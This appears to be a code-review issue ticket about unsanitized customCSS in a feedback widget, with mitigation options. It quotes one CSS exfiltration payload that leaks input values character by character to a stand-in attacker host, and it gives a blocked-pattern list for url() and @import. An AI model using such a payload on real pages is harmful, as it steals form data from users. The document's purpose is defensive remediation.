# CSS Injection Vulnerability in customCSS

---
status: pending
priority: p1
issue_id: "001"
tags: [code-review, security, xss]
dependencies: []
---

## Problem Statement

The `customCSS` field from the API response is injected directly into a `<style>` element without sanitization. While `textContent` prevents script execution, CSS injection can enable data exfiltration, UI redressing, and content spoofing.

**Why it matters:** If an attacker compromises the API or performs a MITM attack, they can inject malicious CSS affecting all users of the widget.

## Findings

**Agent:** security-sentinel

**Location:** `/packages/core/src/feedvalue.ts` lines 496-501

```typescript
if (styling.customCSS) {
  const customStyleEl = document.createElement('style');
  customStyleEl.id = 'fv-widget-custom-styles';
  customStyleEl.textContent = styling.customCSS;  // No sanitization
  document.head.appendChild(customStyleEl);
}
```

**Attack vectors:**
1. Data exfiltration via CSS attribute selectors: `input[value^="a"] { background: url('https://attacker.com/log?char=a'); }`
2. UI redressing/clickjacking by repositioning elements
3. Content spoofing by overlaying fake content

## Proposed Solutions

### Option 1: CSS Sanitizer Library (Recommended)
**Pros:** Comprehensive protection, handles edge cases
**Cons:** Adds dependency, increases bundle size
**Effort:** Medium
**Risk:** Low

```typescript
import DOMPurify from 'dompurify';

if (styling.customCSS) {
  const sanitized = DOMPurify.sanitize(styling.customCSS, {
    FORCE_BODY: true,
    ALLOWED_TAGS: ['style'],
  });
  // Apply sanitized CSS
}
```

### Option 2: Property Whitelist
**Pros:** No dependency, lightweight
**Cons:** May block legitimate CSS, requires maintenance
**Effort:** Medium
**Risk:** Medium (may be bypassed)

```typescript
const ALLOWED_CSS_PROPERTIES = ['color', 'background', 'font-size', 'padding', 'margin', 'border'];
const BLOCKED_PATTERNS = [/url\s*\(/i, /@import/i, /expression/i];

function sanitizeCSS(css: string): string {
  for (const pattern of BLOCKED_PATTERNS) {
    if (pattern.test(css)) {
      console.warn('[FeedValue] Blocked potentially unsafe CSS');
      return '';
    }
  }
  return css;
}
```

### Option 3: Remove customCSS Feature
**Pros:** Eliminates risk entirely
**Cons:** Reduces customization, breaking change
**Effort:** Low
**Risk:** None

## Recommended Action

(To be filled during triage)

## Technical Details

**Affected Files:**
- `packages/core/src/feedvalue.ts`

**Components:** FeedValue widget rendering

## Acceptance Criteria

- [ ] customCSS is sanitized before injection
- [ ] `url()` and `@import` are blocked
- [ ] External resource references are blocked
- [ ] Test cases cover common CSS injection attacks
- [ ] No regressions in legitimate customCSS usage

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-01-23 | Created from code review | Identified by security-sentinel agent |

## Resources

- [OWASP CSS Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
- [DOMPurify](https://github.com/cure53/DOMPurify)
